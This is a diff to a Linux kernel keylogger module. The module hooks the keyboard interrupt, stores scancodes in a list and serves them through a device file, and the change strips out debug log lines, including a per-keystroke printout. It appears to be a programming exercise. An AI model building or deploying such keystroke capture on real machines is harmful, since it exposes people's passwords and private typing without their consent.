@@ -21,16 +21,12 @@ void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t
 	if (len > msg_len)
 	{
 		if (!copy_to_user(buffer + **offset, message, msg_len))
-		{
 			**offset += msg_len;
-			printk(KERN_INFO "keylogger: in copy_to_user len [%ld] et msg_len [%d]\n", len, msg_len);
-		}
 		else
 		{
 			printk(KERN_INFO "copy to user failed \n");
 		}
 	}
-	printk(KERN_INFO "%s", message);
 }
 
 int		browse_linked_list(t_keylst *lst, char *buffer, loff_t **offset, size_t len)
@@ -50,13 +46,11 @@ int		browse_linked_list(t_keylst *lst, char *buffer, loff_t **offset, size_t len
 
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
-	printk(KERN_INFO "keylogger: in read\n");
 	if (read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len) == 2)
 	{
 		read_done = 1;
 		return (*offset);
 	}
-	printk(KERN_INFO "keylogger: offset [%lld]\n", *offset);
 	return 0;
 }
 
@@ -113,13 +107,10 @@ int			add_to_list(unsigned char scancode)
 
 static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 {
-	unsigned char /*status, */scancode;
+	unsigned char	scancode;
 
 	read_done = 0;
 	scancode = inb(KEYBOARD_DATA);
-	printk(KERN_INFO "Scan Code %d %s\n",
-            keyboard_map[scancode & KBD_SCANCODE_MASK],
-            scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
 	if (add_to_list(scancode))
 	{
 		printk(KERN_INFO "kmalloc failed\n");
@@ -142,7 +133,6 @@ static int		__init keylogger_init(void)
 
 static void		__exit keylogger_exit(void)
 {
-	printk(KERN_INFO "exit keylogger\n");
 	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
 	misc_deregister(&key_dev);
 }
